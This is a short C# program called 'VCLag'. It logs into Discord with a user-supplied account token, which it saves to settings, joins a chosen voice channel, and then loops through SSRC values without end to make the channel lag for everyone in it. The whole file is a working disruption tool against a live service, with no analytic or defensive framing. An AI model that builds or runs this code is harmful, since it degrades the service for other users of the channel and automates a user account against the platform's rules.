using Discord.Gateway;
using Discord.Media;
using System;
using System.Threading;

namespace VCLag
{
    class Program
    {
        static void Main(string[] args)
        {
            DiscordSocketClient client = new DiscordSocketClient();
            client.OnLoggedIn += Client_OnLoggedIn;

            if (Properties.Settings.Default.token != "nah")
            {
                Console.WriteLine("New token?(Y/N)");
                var non = Console.ReadLine();
                if (non == "Y".ToLower())
                {
                    Console.Clear();
                    Console.WriteLine("Token: ");
                    var token = Console.ReadLine();
                    Properties.Settings.Default.token = token;
                    Properties.Settings.Default.Save();
                    client.Login(token);
                }
                else if (non == "N".ToLower())
                {
                    Console.Clear();
                    client.Login(Properties.Settings.Default.token);
                }
            } else
            {
                Console.WriteLine("Token: ");
                var token = Console.ReadLine();
                Properties.Settings.Default.token = token;
                Properties.Settings.Default.Save();
                client.Login(token);
            }
            Thread.Sleep(-1);
        }

        private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            Console.WriteLine("Logged in");

            Console.Write("Channel ID: ");

            var session = client.JoinVoiceChannel(new VoiceStateProperties() { ChannelId = ulong.Parse(Console.ReadLine()) });
            session.ReceivePackets = false;
            session.OnConnected += Session_OnConnected;
            session.Connect();
        }

        private static void Session_OnConnected(DiscordVoiceSession session, EventArgs e)
        {
            Console.WriteLine("Connected to voice channel");

            try
            {
                while (session.State == MediaSessionState.Connected)
                {
                    for (uint i = 1; i < 1000000; i++)
                        session.SetSSRC(i);
                }
            }
            catch (InvalidOperationException) { }
        }
    }
}
